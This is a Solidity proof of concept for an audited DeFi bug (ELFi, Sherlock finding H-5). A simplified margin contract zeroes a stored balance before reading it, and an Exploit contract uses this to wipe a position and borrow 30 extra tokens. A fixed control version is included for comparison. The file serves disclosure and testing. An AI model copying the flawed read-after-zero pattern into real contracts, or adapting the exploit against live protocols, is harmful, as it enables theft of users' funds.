// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  ELFi — updatePositionFromBalanceMargin zeroes from-balance before
    reading it (Sherlock 2024-05 H-5, finding 34767).
    changeToken is -110. SOL's from-balance is 50 and should consume 50,
    leaving -60 for WETH, which would keep 30 of its 90. The code stores 0
    first, so the consumed amount is 0. WETH is then wiped from 90 to 0,
    30 too low, and that 30 is borrowable. The control reads the amount first. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Margin {
    struct Position {
        uint256 initialMargin;
        uint256 initialMarginInUsd;
        uint256 initialMarginInUsdFromBalance;
    }

    Position[2] public positions;
    uint256 public lastChange;
    uint256 public wethLeft;
    uint256 public borrowed;
    Asset public token;

    constructor(Asset token_) {
        token = token_;
        positions[0] = Position(100 ether, 100 ether, 50 ether);
        positions[1] = Position(100 ether, 100 ether, 90 ether);
    }

    function update(int256 amount) public {
        int256 remaining = amount;
        for (uint256 i = 0; i < 2; i++) {
            Position storage position = positions[i];
            if (remaining < 0) {
                uint256 addBorrowMarginInUsd = uint256(-remaining) * position.initialMarginInUsd / position.initialMargin;
                if (position.initialMarginInUsdFromBalance <= addBorrowMarginInUsd) {
                    position.initialMarginInUsdFromBalance = 0;
                    // @> VULN: change amount is read after the storage was set to 0
                    lastChange = position.initialMarginInUsdFromBalance * position.initialMargin / position.initialMarginInUsd;
                } else {
                    position.initialMarginInUsdFromBalance -= addBorrowMarginInUsd;
                    lastChange = uint256(-remaining);
                }
                remaining += int256(lastChange);
            }
        }
        wethLeft = positions[1].initialMarginInUsdFromBalance;
    }

    function updateFair(int256 amount) public {
        int256 remaining = amount;
        for (uint256 i = 0; i < 2; i++) {
            Position storage position = positions[i];
            if (remaining < 0) {
                uint256 addBorrowMarginInUsd = uint256(-remaining) * position.initialMarginInUsd / position.initialMargin;
                if (position.initialMarginInUsdFromBalance <= addBorrowMarginInUsd) {
                    uint256 consumed = position.initialMarginInUsdFromBalance * position.initialMargin / position.initialMarginInUsd;
                    position.initialMarginInUsdFromBalance = 0;
                    lastChange = consumed;
                } else {
                    position.initialMarginInUsdFromBalance -= addBorrowMarginInUsd;
                    lastChange = uint256(-remaining);
                }
                remaining += int256(lastChange);
            }
        }
        wethLeft = positions[1].initialMarginInUsdFromBalance;
    }

    function borrowShortfall() external {
        uint256 fairLeft = 30 ether;
        if (wethLeft < fairLeft) {
            borrowed = fairLeft - wethLeft;
            require(token.transfer(msg.sender, borrowed), "borrow");
        }
    }
}

contract Exploit {
    Asset public token;
    Margin public book;
    uint256 public left;
    uint256 public took;
    uint256 public fairLeft;

    constructor() {
        token = new Asset();
        book = new Margin(token);
    }

    function run() external {
        token.mint(address(book), 30 ether);
        book.update(-110 ether);
        left = book.wethLeft();
        book.borrowShortfall();
        took = book.borrowed();
        require(book.lastChange() == 0, "zero change");
        require(left == 0, "wiped");
        require(took == 30 ether, "extra");
    }

    function runControl() external {
        Margin fair = new Margin(token);
        token.mint(address(fair), 30 ether);
        fair.updateFair(-110 ether);
        fairLeft = fair.wethLeft();
        fair.borrowShortfall();
        require(fairLeft == 30 ether, "kept");
        require(fair.borrowed() == 0, "no borrow");
        require(token.balanceOf(address(fair)) == 30 ether, "still there");
    }
}
